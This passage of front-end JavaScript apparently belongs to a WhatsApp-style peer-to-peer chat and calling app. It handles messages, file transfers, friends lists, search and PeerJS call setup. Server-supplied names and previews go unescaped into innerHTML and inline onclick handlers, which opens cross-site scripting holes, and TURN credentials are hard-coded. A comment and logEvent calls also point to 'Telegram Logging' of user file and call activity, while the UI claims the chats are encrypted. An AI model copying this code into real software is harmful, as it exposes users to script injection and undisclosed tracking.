        if (data.isTyping && senderPeer === activeChatUsername) {
            updateChatHeader('typing...');
            clearTimeout(typingRestoreTimer);
            typingRestoreTimer = setTimeout(() => updateChatHeader(), 2200);
        } else if (senderPeer === activeChatUsername) {
            updateChatHeader();
        }
    }
    else if (data.type === 'message-delivered') {
        updateMessageStatus(data.id, 'delivered');
    }
    else if (data.type === 'message-read') {
        updateMessageStatus(data.id, 'read');
    }
    else if (data.type === 'read-chat') {
        markAllVisibleSentAsRead();
    }
    else if (data.type === 'edit-message') {
        applyMessageEdit(data.id, data.text);
    }
    else if (data.type === 'delete-message') {
        applyMessageDelete(data.id);
    }
    else if (data.type === 'reaction-message') {
        applyMessageReaction(data.id, data.emoji);
    }
    else if (data.type === 'reaction') {
        showFloatingReaction(data.emoji, false);
    }
    else if (data.type === 'file-start') {
        incomingFileBuffers[data.transferId] = { chunks: [], totalChunks: data.totalChunks, metadata: { fileName: data.fileName, fileSize: data.fileSize, mimeType: data.mimeType } };
        fileProgress.classList.remove('hidden');
        fileProgressFill.style.width = '0%';
        fileProgressText.textContent = `Receiving ${data.fileName} (0%)`;
    }
    else if (data.type === 'file-chunk') {
        const b = incomingFileBuffers[data.transferId]; if (!b) return;
        b.chunks[data.chunkIndex] = data.data;
        const pct = Math.round((b.chunks.filter(c => c).length / b.totalChunks) * 100);
        fileProgressFill.style.width = pct + '%';
        fileProgressText.textContent = `Receiving ${b.metadata.fileName} (${pct}%)`;
    }
    else if (data.type === 'file-end') {
        playNotificationSound();
        const b = incomingFileBuffers[data.transferId]; if (!b) return;
        const blob = new Blob(b.chunks, { type: b.metadata.mimeType });
        const url = URL.createObjectURL(blob);
        addFileToChat(b.metadata.fileName, b.metadata.fileSize, b.metadata.mimeType, null, false, url, blob);
        updateChatMeta(senderPeer, '📎 ' + b.metadata.fileName, Date.now());
        markUnreadFromPeer(senderPeer, '📎 ' + b.metadata.fileName);
        logEvent('file_sent', { fileName: b.metadata.fileName, fileSize: b.metadata.fileSize, sender: userRole === 'creator' ? 'joiner' : 'creator' });
        fileProgress.classList.add('hidden');
        showToast(`📥 ${b.metadata.fileName} received!`);
        delete incomingFileBuffers[data.transferId];
    }
    else if (data.type === 'voice') {
        playNotificationSound();
        // Receive voice message
        const binary = atob(data.data);
        const array = new Uint8Array(binary.length);
        for (let i = 0; i < binary.length; i++) array[i] = binary.charCodeAt(i);
        const blob = new Blob([array], { type: 'audio/webm' });
        const url = URL.createObjectURL(blob);
        addVoiceMessageToChat(blob, false, url, data.id || null);
        updateChatMeta(senderPeer, '🎙 Voice message', Date.now());
        markUnreadFromPeer(senderPeer, '🎙 Voice message');
        if (dataConnection && dataConnection.open && data.id) {
            dataConnection.send({ type: 'message-delivered', id: data.id, from: currentUser ? currentUser.username : userRole });
            if (isViewingChatWith(senderPeer)) dataConnection.send({ type: 'message-read', id: data.id, from: currentUser ? currentUser.username : userRole });
        }
        showToast('🎙 Voice message received');
    }
}

function addFileToChat(fileName, fileSize, mimeType, arrayBuffer, isSent, blobUrl, blob, isHistoryLoad = false, messageId = null, status = 'sent', base64 = null) {
    if (!messageId) messageId = 'file_' + Date.now();
    if (!isHistoryLoad && window.saveMsgToDB && activeChatUsername) {
        if (!base64 && blob) {
            const reader = new FileReader();
            reader.onload = () => {
                saveMsgToDB(currentUser ? currentUser.username : 'anon', activeChatUsername, {
                    id: messageId, type: 'file', fileName, fileSize, mimeType, isSent, status, ts: Date.now(), base64: reader.result
                });
            };
            reader.readAsDataURL(blob);
        } else if (!base64 && arrayBuffer) {
            const b64 = arrayBufferToBase64(arrayBuffer);
            saveMsgToDB(currentUser ? currentUser.username : 'anon', activeChatUsername, {
                id: messageId, type: 'file', fileName, fileSize, mimeType, isSent, status, ts: Date.now(), base64: 'data:' + mimeType + ';base64,' + b64
            });
        } else if (base64) {
            saveMsgToDB(currentUser ? currentUser.username : 'anon', activeChatUsername, {
                id: messageId, type: 'file', fileName, fileSize, mimeType, isSent, status, ts: Date.now(), base64
            });
        }
    }

    const div = document.createElement('div');
    div.className = 'chat-msg ' + (isSent ? 'sent' : 'received');
    div.setAttribute('data-message-id', messageId);
    let mediaUrl = null;
    if (isSent && arrayBuffer) mediaUrl = URL.createObjectURL(new Blob([arrayBuffer], { type: mimeType }));
    else if (blobUrl) mediaUrl = blobUrl;
    else if (base64) mediaUrl = base64;

    if (isImageFile(fileName) && mediaUrl) {
        const img = document.createElement('img');
        img.src = mediaUrl;
        img.className = 'chat-image';
        img.alt = fileName;
        img.title = 'Tap to view full screen';
        img.addEventListener('click', () => openMediaPreview(mediaUrl, 'image', fileName));
        div.appendChild(img);
        const dl = document.createElement('a');
        dl.href = mediaUrl; dl.download = fileName; dl.className = 'file-download';
        dl.innerHTML = `<i class="fas fa-download"></i> Download`;
        div.appendChild(dl);
    } else if (isVideoFile(fileName) && mediaUrl) {
        const video = document.createElement('video');
        video.src = mediaUrl;
        video.className = 'chat-video';
        video.controls = true;
        video.playsInline = true;
        video.preload = 'metadata';
        video.title = 'Tap to view full screen';
        video.addEventListener('dblclick', () => openMediaPreview(mediaUrl, 'video', fileName));
        div.appendChild(video);
        const dl = document.createElement('a');
        dl.href = mediaUrl; dl.download = fileName; dl.className = 'file-download';
        dl.innerHTML = `<i class="fas fa-download"></i> Download video`;
        div.appendChild(dl);
    } else {
        const fb = document.createElement('div'); fb.className = 'file-bubble';
        const ic = document.createElement('i'); ic.className = 'fas ' + getFileIcon(fileName); ic.style.color = isSent ? '#fff' : 'var(--wa-teal)';
        const info = document.createElement('div'); info.className = 'file-info';
        const ns = document.createElement('span'); ns.className = 'file-name'; ns.textContent = fileName;
        const ss = document.createElement('span'); ss.className = 'file-size'; ss.textContent = formatFileSize(fileSize);
        info.appendChild(ns); info.appendChild(document.createElement('br')); info.appendChild(ss);
        fb.appendChild(ic); fb.appendChild(info); div.appendChild(fb);
        if (mediaUrl) {
            const dl = document.createElement('a'); dl.href = mediaUrl; dl.download = fileName; dl.className = 'file-download'; dl.innerHTML = '<i class="fas fa-download"></i> Download'; div.appendChild(dl);
        }
    }
    const meta = document.createElement('div');
    meta.className = 'msg-meta';
    meta.innerHTML = `<span>${new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}</span>`;
    div.appendChild(meta);
    chatMessages.appendChild(div); chatMessages.scrollTop = chatMessages.scrollHeight;
}

// ============ AUTO-JOIN URL ============
function checkUrlForRoom() {
    const p = new URLSearchParams(window.location.search);
    const r = p.get('room');
    if (r) {
        console.log('Auto-joining room from URL:', r);
        setTimeout(() => initRoom(r, false), 800);
    }
}

// ============ DRAGGABLE SELF VIDEO ============
(function () {
    const w = document.getElementById('selfVideoWrapper');
    let drag = false, sx, sy, ox, oy;
    if (w) {
        w.addEventListener('mousedown', (e) => { drag = true; sx = e.clientX; sy = e.clientY; const r = w.getBoundingClientRect(); ox = r.left; oy = r.top; w.style.transition = 'none'; });
        document.addEventListener('mousemove', (e) => { if (!drag) return; w.style.position = 'absolute'; w.style.left = (ox + e.clientX - sx) + 'px'; w.style.top = (oy + e.clientY - sy) + 'px'; w.style.right = 'auto'; w.style.bottom = 'auto'; });
        document.addEventListener('mouseup', () => { drag = false; w.style.transition = ''; });
        w.addEventListener('touchstart', (e) => { const t = e.touches[0]; drag = true; sx = t.clientX; sy = t.clientY; const r = w.getBoundingClientRect(); ox = r.left; oy = r.top; w.style.transition = 'none'; });
        document.addEventListener('touchmove', (e) => { if (!drag) return; const t = e.touches[0]; w.style.position = 'absolute'; w.style.left = (ox + t.clientX - sx) + 'px'; w.style.top = (oy + t.clientY - sy) + 'px'; w.style.right = 'auto'; w.style.bottom = 'auto'; });
        document.addEventListener('touchend', () => { drag = false; w.style.transition = ''; });
    }
})();

// ============ THEMES ============
function setTheme(theme) {
    const root = document.documentElement;
    if (theme === 'cyan') {
        root.style.setProperty('--wa-teal', '#00f0ff');
        root.style.setProperty('--wa-teal-dark', '#004c66');
    } else if (theme === 'green') {
        root.style.setProperty('--wa-teal', '#00a884');
        root.style.setProperty('--wa-teal-dark', '#005c4b');
    } else if (theme === 'pink') {
        root.style.setProperty('--wa-teal', '#ff2d75');
        root.style.setProperty('--wa-teal-dark', '#660024');
    } else if (theme === 'gold') {
        root.style.setProperty('--wa-teal', '#ffd700');
        root.style.setProperty('--wa-teal-dark', '#664c00');
    }
    showToast(`🎨 Theme changed: ${theme.toUpperCase()}`);
}
window.setTheme = setTheme;

function playSciFiSound(type) {
    try {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.connect(gain);
        gain.connect(ctx.destination);
        const now = ctx.currentTime;
        if (type === 'pop') {
            osc.type = 'sine';
            osc.frequency.setValueAtTime(450, now);
            osc.frequency.exponentialRampToValueAtTime(900, now + 0.12);
            gain.gain.setValueAtTime(0.2, now);
            gain.gain.exponentialRampToValueAtTime(0.01, now + 0.12);
            osc.start(now); osc.stop(now + 0.12);
        } else if (type === 'join') {
            osc.type = 'triangle';
            osc.frequency.setValueAtTime(300, now);
            osc.frequency.exponentialRampToValueAtTime(650, now + 0.25);
            gain.gain.setValueAtTime(0.25, now);
            gain.gain.exponentialRampToValueAtTime(0.01, now + 0.25);
            osc.start(now); osc.stop(now + 0.25);
        }
    } catch (e) {}
}

function setupActiveSpeakerDetector(stream, videoEl) {
    try {
        const audioTracks = stream.getAudioTracks();
        if (!audioTracks.length) return;
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const src = ctx.createMediaStreamSource(new MediaStream([audioTracks[0]]));
        const analyser = ctx.createAnalyser();
        analyser.fftSize = 256;
        src.connect(analyser);
        const data = new Uint8Array(analyser.frequencyBinCount);
        setInterval(() => {
            if (!isCallActive) return;
            analyser.getByteFrequencyData(data);
            let sum = 0;
            for (let i = 0; i < data.length; i++) sum += data[i];
            const avg = sum / data.length;
            if (avg > 25 && videoEl) {
                videoEl.classList.add('active-speaker');
            } else if (videoEl) {
                videoEl.classList.remove('active-speaker');
            }
        }, 400);
    } catch (e) {}
}

function sendReaction(emoji) {
    showFloatingReaction(emoji, true);
    if (dataConnection && dataConnection.open) {
        dataConnection.send({ type: 'reaction', emoji });
    }
}
window.sendReaction = sendReaction;

function showFloatingReaction(emoji, isSelf) {
    playSciFiSound('pop');
    const el = document.createElement('div');
    el.className = 'floating-emoji';
    el.textContent = emoji;
    el.style.left = (Math.random() * 60 + 20) + '%';
    document.body.appendChild(el);
    setTimeout(() => { if (el && el.parentNode) el.parentNode.removeChild(el); }, 2200);
}

// ============ APP ACTIONS & PEER LOGICS (WHATSAPP SPECIFIC) ============
async function handleCyberRegister(e) {
    e.preventDefault();
    const username = document.getElementById('regUsername').value.trim().toLowerCase();
    const displayName = document.getElementById('regDisplayName').value.trim();
    const password = document.getElementById('regPassword').value;

    try {
        const resp = await fetch(`${SERVER_URL}/api/auth/register`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password, display_name: displayName })
        });
        const result = await resp.json();
        if (resp.ok && result.status === 'ok') {
            showToast('🚀 Cyber ID Generated Successfully!');
            loginSession(result.user);
        } else {
            showToast('❌ ' + (result.error || 'Registration failed'));
        }
    } catch (err) {
        showToast('❌ Connection error to Cyber Space server');
    }
}
window.handleCyberRegister = handleCyberRegister;

async function handleCyberLogin(e) {
    e.preventDefault();
    const username = document.getElementById('loginUsername').value.trim().toLowerCase();
    const password = document.getElementById('loginPassword').value;

    try {
        const resp = await fetch(`${SERVER_URL}/api/auth/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
        });
        const result = await resp.json();
        if (resp.ok && result.status === 'ok') {
            showToast('🔑 Logged in to Cyber Space!');
            loginSession(result.user);
        } else {
            showToast('❌ ' + (result.error || 'Invalid credentials'));
        }
    } catch (err) {
        showToast('❌ Connection error to Cyber Space server');
    }
}
window.handleCyberLogin = handleCyberLogin;

function loginSession(user) {
    currentUser = user;
    localStorage.setItem('cyberUser', JSON.stringify(user));
    initCyberDashboard();
    switchAppTab('chats');
}

function handleCyberLogout() {
    showToast('👋 Logged out from Cyber Space');
    localStorage.removeItem('cyberUser');
    currentUser = null;

    if (cyberHeartbeatInterval) { clearInterval(cyberHeartbeatInterval); cyberHeartbeatInterval = null; }
    if (cyberFriendsInterval) { clearInterval(cyberFriendsInterval); cyberFriendsInterval = null; }

    if (peer) {
        peer.destroy();
        peer = null;
    }

    // Toggle Tab Views Back to Onboarding states
    document.getElementById('chatsLoggedOutCard').classList.remove('hidden');
    document.getElementById('chatsLoggedInDashboard').classList.add('hidden');
    document.getElementById('callsLoggedOutCard').classList.remove('hidden');
    document.getElementById('callsLoggedInDashboard').classList.add('hidden');
    document.getElementById('appFab').classList.add('hidden');

    document.getElementById('cyberAuthBox').classList.remove('hidden');
    document.getElementById('cyberDashboardBox').classList.add('hidden');
    
    // Reset forms
    document.getElementById('cyberLoginForm').reset();
    document.getElementById('cyberRegisterForm').reset();
    switchAppTab('profile');
}
window.handleCyberLogout = handleCyberLogout;

function initCyberDashboard() {
    // Show Dashboards, Hide Onboardings
    document.getElementById('chatsLoggedOutCard').classList.add('hidden');
    document.getElementById('chatsLoggedInDashboard').classList.remove('hidden');
    document.getElementById('callsLoggedOutCard').classList.add('hidden');
    document.getElementById('callsLoggedInDashboard').classList.remove('hidden');
    document.getElementById('appFab').classList.remove('hidden');

    document.getElementById('cyberAuthBox').classList.add('hidden');
    document.getElementById('cyberDashboardBox').classList.remove('hidden');
    document.getElementById('cyberProfileName').textContent = currentUser.display_name;
    document.getElementById('cyberProfileId').textContent = '@' + currentUser.username;

    loadUnreadCounts();

    // Start background heartbeats & friends polling
    sendHeartbeat();
    if (cyberHeartbeatInterval) clearInterval(cyberHeartbeatInterval);
    cyberHeartbeatInterval = setInterval(sendHeartbeat, 15000);
    
    pollFriendsList();
    if (cyberFriendsInterval) clearInterval(cyberFriendsInterval);
    cyberFriendsInterval = setInterval(pollFriendsList, 10000);

    // Initialize PeerJS with the user's permanent username!
    initCyberPeer();
}

async function sendHeartbeat() {
    if (!currentUser) return;
    try {
        await fetch(`${SERVER_URL}/api/users/heartbeat`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: currentUser.username })
        });
    } catch (e) { }
}

async function pollFriendsList() {
    if (!currentUser) return;
    try {
        // 1. Poll Friends List
        const resp = await fetch(`${SERVER_URL}/api/friends/list?username=${currentUser.username}`);
        const result = await resp.json();
        if (resp.ok && result.friends) {
            renderFriendsList(result.friends);
        }

        // 2. Poll Pending Friend Requests
        const reqResp = await fetch(`${SERVER_URL}/api/friends/requests-pending?username=${currentUser.username}`);
        const reqResult = await reqResp.json();
        if (reqResp.ok && reqResult.requests) {
            renderFriendRequests(reqResult.requests);
        }
    } catch (e) { }
}

function renderFriendsList(friends) {
    lastFriendsCache = friends || [];
    loadChatPrefs();
    const chatsListEl = document.getElementById('cyberFriendsChatsList');
    const callsListEl = document.getElementById('cyberFriendsCallsList');
    
    if (!friends || friends.length === 0) {
        const emptyHtml = '<p class="cyber-empty">No conversations yet. Search friends to start chatting!</p>';
        chatsListEl.innerHTML = emptyHtml;
        callsListEl.innerHTML = '<p class="cyber-empty">No online contacts available</p>';
        return;
    }

    const sortedFriends = [...friends].sort((a, b) => {
        const ap = (chatPrefs[a.username] || {}).pinned ? 1 : 0, bp = (chatPrefs[b.username] || {}).pinned ? 1 : 0;
        const aa = (chatPrefs[a.username] || {}).archived ? 1 : 0, ba = (chatPrefs[b.username] || {}).archived ? 1 : 0;
        if (bp !== ap) return bp - ap;
        if (aa !== ba) return aa - ba;
        return ((chatMeta[b.username] || {}).lastAt || 0) - ((chatMeta[a.username] || {}).lastAt || 0);
    });

    // 1. Render Chats Tab List
    chatsListEl.innerHTML = '';
    sortedFriends.forEach(f => {
        const item = document.createElement('div');
        item.className = 'cyber-item' + ((chatPrefs[f.username] || {}).archived ? ' archived-chat' : '') + ((chatPrefs[f.username] || {}).pinned ? ' pinned-chat' : '');
        item.setAttribute('data-chat-username', f.username);
        const statusClass = f.is_online ? 'online' : 'offline';
        const statusText = f.is_online ? 'Online' : 'Offline';
        const safeDisplayName = encodeURIComponent(String(f.display_name || f.username)).replace(/'/g, '%27');
        const meta = chatMeta[f.username] || {};
        const preview = meta.lastMessage || 'Tap to chat or call';
        const lastTime = formatChatListTime(meta.lastAt);

        item.innerHTML = `
            <div class="cyber-item-info">
                <div class="cyber-item-name"><span>${(chatPrefs[f.username] || {}).pinned ? '📌 ' : ''}${(chatPrefs[f.username] || {}).muted ? '🔇 ' : ''}${f.display_name}</span><span class="chat-last-time">${lastTime}</span><span class="unread-badge" style="display:none;">0</span></div>
                <div class="cyber-item-id chat-row-sub">
                    <span class="status-dot ${statusClass}"></span>
                    <span class="chat-last-preview">${preview}</span>
                </div>
                <div class="chat-row-username">@${f.username} • ${statusText}</div>
            </div>
            <div class="cyber-actions">
                <button onclick="startFriendChat('${f.username}', '${safeDisplayName}')" class="btn btn-whatsapp-outline btn-small quick-call-btn" style="padding: 6px 10px;" title="Chat with friend">
                    <i class="fas fa-comment-dots"></i>
                </button>
                <button onclick="startFriendCall('${f.username}', 'audio')" class="btn btn-whatsapp-outline btn-small quick-call-btn" style="padding: 6px 10px; color: var(--wa-teal); border-color: var(--wa-teal);" title="Voice Call" ${f.is_online ? '' : 'disabled'}>
                    <i class="fas fa-phone-alt"></i>
                </button>
                <button onclick="startFriendCall('${f.username}', 'video')" class="btn btn-whatsapp btn-small quick-call-btn" style="padding: 6px 10px;" title="Video Call" ${f.is_online ? '' : 'disabled'}>
                    <i class="fas fa-video"></i>
                </button>
                <button onclick="openChatOptions('${f.username}')" class="btn btn-whatsapp-outline btn-small quick-call-btn" title="Chat options"><i class="fas fa-ellipsis-v"></i></button>
                <button onclick="removeCyberFriend('${f.username}')" class="btn btn-danger-app btn-small" style="padding: 6px 10px; background: rgba(255, 45, 117, 0.15); border: 1px solid rgba(255, 45, 117, 0.45); color: var(--neon-pink);" title="Remove Friend">
                    <i class="fas fa-user-minus"></i>
                </button>
            </div>
        `;
        chatsListEl.appendChild(item);
    });
    updateUnreadBadges();

    // 2. Render Calls Tab List (WhatsApp-style: Video Call and Voice Call separate buttons!)
    callsListEl.innerHTML = '';
    renderLocalCallHistory();
    sortedFriends.forEach(f => {
        const item = document.createElement('div');
        item.className = 'cyber-item';
        const statusClass = f.is_online ? 'online' : 'offline';
        const statusText = f.is_online ? 'Online' : 'Offline';

        item.innerHTML = `
            <div class="cyber-item-info">
                <div class="cyber-item-name">${f.display_name}</div>
                <div class="cyber-item-id">
                    <span class="status-dot ${statusClass}"></span>
                    @${f.username} (${statusText})
                </div>
            </div>
            <div class="cyber-actions" style="display:flex; gap:6px;">
                <!-- Voice Call Button -->
                <button onclick="startFriendCall('${f.username}', 'audio')" class="btn btn-whatsapp-outline btn-small" style="padding: 6px 10px; color: var(--wa-teal); border-color: var(--wa-teal);" title="Voice Call" ${f.is_online ? '' : 'disabled style="opacity:0.5; cursor:not-allowed;"'}>
                    <i class="fas fa-phone-alt"></i> Voice
                </button>
                <!-- Video Call Button -->
                <button onclick="startFriendCall('${f.username}', 'video')" class="btn btn-whatsapp btn-small" style="padding: 6px 10px;" title="Video Call" ${f.is_online ? '' : 'disabled style="opacity:0.5; cursor:not-allowed;"'}>
                    <i class="fas fa-video"></i> Video
                </button>
            </div>
        `;
        callsListEl.appendChild(item);
    });
}

function renderFriendRequests(requests) {
    const sec = document.getElementById('cyberIncomingRequestsSection');
    const listEl = document.getElementById('cyberIncomingRequestsList');
    
    if (!requests || requests.length === 0) {
        sec.classList.add('hidden');
        return;
    }
    
    sec.classList.remove('hidden');
    listEl.innerHTML = '';
    
    requests.forEach(r => {
        const item = document.createElement('div');
        item.className = 'cyber-item';
        item.innerHTML = `
            <div class="cyber-item-info">
                <div class="cyber-item-name">${r.display_name}</div>
                <div class="cyber-item-id">@${r.username}</div>
            </div>
            <div class="cyber-actions" style="display:flex; gap:6px;">
                <button onclick="acceptFriendRequest('${r.username}')" class="btn btn-whatsapp btn-small" style="padding: 6px 10px; font-size: 0.75rem;" title="Accept request"><i class="fas fa-check"></i> Accept</button>
                <button onclick="declineFriendRequest('${r.username}')" class="btn btn-danger-app btn-small" style="padding: 6px 10px; font-size: 0.75rem; background: rgba(255, 45, 117, 0.15); border: 1px solid rgba(255, 45, 117, 0.45); color: var(--neon-pink);" title="Decline request"><i class="fas fa-times"></i> Decline</button>
            </div>
        `;
        listEl.appendChild(item);
    });
}
window.renderFriendRequests = renderFriendRequests;

async function acceptFriendRequest(senderUsername) {
    if (!currentUser) return;
    try {
        const resp = await fetch(`${SERVER_URL}/api/friends/accept-request`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: currentUser.username, sender_username: senderUsername })
        });
        const result = await resp.json();
        if (resp.ok && result.status === 'ok') {
            showToast(`✅ You are now friends with @${senderUsername}!`);
            pollFriendsList();
            if (document.getElementById('cyberSearchInput').value.trim()) {
                handleCyberSearch();
            }
        } else {
            showToast('❌ ' + (result.error || 'Failed to accept request'));
        }
    } catch (e) {
        showToast('❌ Connection error');
    }
}
window.acceptFriendRequest = acceptFriendRequest;

async function declineFriendRequest(senderUsername) {
    if (!currentUser) return;
    try {
        const resp = await fetch(`${SERVER_URL}/api/friends/decline-request`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: currentUser.username, sender_username: senderUsername })
        });
        const result = await resp.json();
        if (resp.ok && result.status === 'ok') {
            showToast(`Declined friend request from @${senderUsername}`);
            pollFriendsList();
            if (document.getElementById('cyberSearchInput').value.trim()) {
                handleCyberSearch();
            }
        } else {
            showToast('❌ ' + (result.error || 'Failed to decline request'));
        }
    } catch (e) {
        showToast('❌ Connection error');
    }
}
window.declineFriendRequest = declineFriendRequest;

async function removeCyberFriend(friendUsername) {
    if (!currentUser) return;
    if (!confirm(`Are you sure you want to remove @${friendUsername} from your friends list?`)) return;
    try {
        const resp = await fetch(`${SERVER_URL}/api/friends/remove`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: currentUser.username, friend_username: friendUsername })
        });
        const result = await resp.json();
        if (resp.ok && result.status === 'ok') {
            showToast(`🗑️ Removed @${friendUsername} from friends list`);
            pollFriendsList();
            if (document.getElementById('cyberSearchInput').value.trim()) {
                handleCyberSearch();
            }
        } else {
            showToast('❌ ' + (result.error || 'Failed to remove friend'));
        }
    } catch (e) {
        showToast('❌ Connection error');
    }
}
window.removeCyberFriend = removeCyberFriend;

async function handleCyberSearch() {
    const query = document.getElementById('cyberSearchInput').value.trim();
    if (!query) {
        showToast('Please enter a Cyber ID or name to search');
        return;
    }

    const resultsEl = document.getElementById('cyberSearchResults');
    resultsEl.innerHTML = '<p class="cyber-empty"><i class="fas fa-spinner fa-spin"></i> Searching...</p>';

    try {
        const resp = await fetch(`${SERVER_URL}/api/users/search?query=${query}&username=${currentUser.username}`);
        const result = await resp.json();
        if (resp.ok && result.results) {
            renderSearchResults(result.results);
        } else {
            resultsEl.innerHTML = '<p class="cyber-empty">No users found</p>';
        }
    } catch (err) {
        resultsEl.innerHTML = '<p class="cyber-empty">Error loading results</p>';
    }
}
window.handleCyberSearch = handleCyberSearch;

function renderSearchResults(results) {
    const resultsEl = document.getElementById('cyberSearchResults');
    if (!results || results.length === 0) {
        resultsEl.innerHTML = '<p class="cyber-empty">No users found</p>';
        return;
    }

    resultsEl.innerHTML = '';
    results.forEach(r => {
        const item = document.createElement('div');
        item.className = 'cyber-item';

        let actionHtml = '';
        if (r.status_state === 'friends') {
            actionHtml = '<span style="font-size:0.8rem; color:var(--wa-teal); font-weight:600;"><i class="fas fa-check-circle"></i> Friends</span>';
        } else if (r.status_state === 'sent') {
            actionHtml = '<span style="font-size:0.85rem; color:var(--text-secondary); font-weight:600;"><i class="fas fa-paper-plane"></i> Sent</span>';
        } else if (r.status_state === 'received') {
            actionHtml = `<button onclick="acceptFriendRequest('${r.username}')" class="btn btn-whatsapp btn-small" style="padding: 6px 12px;"><i class="fas fa-check"></i> Accept</button>`;
        } else {
            actionHtml = `<button onclick="addCyberFriend('${r.username}', this)" class="btn btn-whatsapp btn-small" style="padding: 6px 12px;"><i class="fas fa-user-plus"></i> Add</button>`;
        }

        item.innerHTML = `
            <div class="cyber-item-info">
                <div class="cyber-item-name">${r.display_name}</div>
                <div class="cyber-item-id">@${r.username}</div>
            </div>
            <div class="cyber-actions">
                ${actionHtml}
            </div>
        `;
        resultsEl.appendChild(item);
    });
}

async function addCyberFriend(friendUsername, btn) {
    if (!currentUser) return;
    btn.disabled = true;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';

    try {
        const resp = await fetch(`${SERVER_URL}/api/friends/add`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: currentUser.username, friend_username: friendUsername })
        });
        const result = await resp.json();
        if (resp.ok && result.status === 'ok') {
            showToast(`✅ Friend request sent to @${friendUsername}!`);
            pollFriendsList();
            handleCyberSearch();
        } else {
            showToast('❌ ' + (result.error || 'Failed to add friend'));
            btn.disabled = false;
            btn.innerHTML = '<i class="fas fa-user-plus"></i> Add';
        }
    } catch (e) {
        showToast('❌ Connection error');
        btn.disabled = false;
        btn.innerHTML = '<i class="fas fa-user-plus"></i> Add';
    }
}
window.addCyberFriend = addCyberFriend;

function startFriendChat(friendUsername, displayName = null) {
    if (!peer || peer.destroyed) {
        showToast('⚠️ Connecting to Cyber Space...');
        return;
    }
    activeChatUsername = friendUsername;
    clearUnreadForPeer(friendUsername);
    setTimeout(sendReadReceiptForActiveChat, 250);
    try { activeChatDisplayName = displayName ? decodeURIComponent(displayName) : '@' + friendUsername; }
    catch(e) { activeChatDisplayName = displayName || '@' + friendUsername; }
    showToast(`💬 Opening chat with @${friendUsername}...`);
    showPage(roomPage);
    roomIdDisplay.textContent = activeChatDisplayName;
    waitingScreen.style.display = 'none';
    callScreen.classList.add('hidden');
    chatPanel.classList.add('direct-chat-mode');
    chatPanel.classList.remove('hidden');
    updateChatHeader('connecting...');
    chatMessages.innerHTML = '<div class="chat-date-pill">Today</div><div class="chat-system">Messages and calls are peer-to-peer encrypted 🔒</div>';
    
    // Load history from IndexedDB
    if (window.loadMsgsFromDB) {
        const owner = currentUser ? currentUser.username : 'anon';
        loadMsgsFromDB(owner, friendUsername).then(msgs => {
            msgs.forEach(m => {
                if (m.type === 'text') addChatMessage(m.text, m.isSent, false, m.id, m.status, m.reply, true);
                else if (m.type === 'voice') addVoiceMessageToChat(null, m.isSent, m.url, m.id, m.status, true, m.base64);
                else if (m.type === 'file') addFileToChat(m.fileName, m.fileSize, m.mimeType, null, m.isSent, m.url, null, true, m.id, m.status, m.base64);
            });
            setTimeout(() => { if(chatMessages) chatMessages.scrollTop = chatMessages.scrollHeight; }, 100);
        });
    }

    // Connect P2P data connection
    dataConnection = peer.connect(friendUsername, { reliable: true });
    dataConnection.on('open', () => {
        updateChatHeader('online • peer-to-peer connected');
        showToast('⚡ Direct secure chat connected!');
        playSciFiSound('join');
        if (dataConnection && dataConnection.open) {
            dataConnection.send({ type: 'typing', isTyping: false, from: currentUser ? currentUser.username : userRole });
            sendReadReceiptForActiveChat();
        }
    });
    dataConnection.on('data', handleDataMessage);
    dataConnection.on('close', () => updateChatHeader('offline'));
    dataConnection.on('error', () => updateChatHeader('connection failed'));
}
window.startFriendChat = startFriendChat;

function startFriendCall(friendUsername, callType = 'video') {
    if (!peer || peer.destroyed) {
        showToast('⚠️ Connecting to Cyber Space...');
        return;
    }
    activeChatUsername = friendUsername;
    activeChatDisplayName = '@' + friendUsername;
    updateChatHeader(callType === 'audio' ? 'voice call ringing...' : 'video call ringing...');
    recordCallHistory(friendUsername, 'outgoing', callType, 'started');
    showToast(`📞 Starting ${callType} call to @${friendUsername}...`);
    showPage(roomPage);
    roomIdDisplay.textContent = callType === 'audio' ? 'VOICE CALL' : 'VIDEO CALL';
    chatPanel.classList.remove('direct-chat-mode');
    waitingScreen.style.display = 'flex';
    
    // Set professional Room ID and Role for Telegram Logging
    currentRoomId = currentUser.username + '_to_' + friendUsername;
    userRole = 'creator';
    
    callPeer(friendUsername, callType);
}
window.startFriendCall = startFriendCall;

function initCyberPeer() {
    if (peer && !peer.destroyed) {
        peer.destroy();
    }

    // Initialize PeerJS with the user's permanent username as their Peer ID!
    peer = new Peer(currentUser.username, {
        debug: 0,
        config: { iceServers: [
            { urls: 'stun:stun.l.google.com:19302' },
            { urls: 'stun:stun1.l.google.com:19302' },
            { urls: 'stun:stun2.l.google.com:19302' },
            { urls: 'stun:stun3.l.google.com:19302' },
            { urls: 'stun:stun.cloudflare.com:3478' },
            { urls: 'stun:openrelay.metered.ca:80' },
            { urls: 'turn:openrelay.metered.ca:80', username: 'openrelayproject', credential: 'OZ0sP3R4qX9sP1nT' },
            { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'OZ0sP3R4qX9sP1nT' }
        ]}
    });

    peer.on('open', (id) => {
        console.log('Cyber Peer active with ID:', id);
    });

    peer.on('error', (err) => {
        console.error('Cyber Peer error:', err.type, err);
        if (err.type === 'unavailable-id') {
            showToast('🔄 Cyber ID resetting, auto-reconnecting in 5s...');
            setTimeout(() => {
                if (currentUser) {
                    console.log('🔄 Retrying PeerJS connection...');
                    initCyberPeer();
                }
            }, 5000);
        } else {
            showToast('Cyber Space connection issue: ' + err.type);
        }
    });

    peer.on('disconnected', () => {
        if (peer && !peer.destroyed) peer.reconnect();
    });

    peer.on('call', handleIncomingCyberCall);
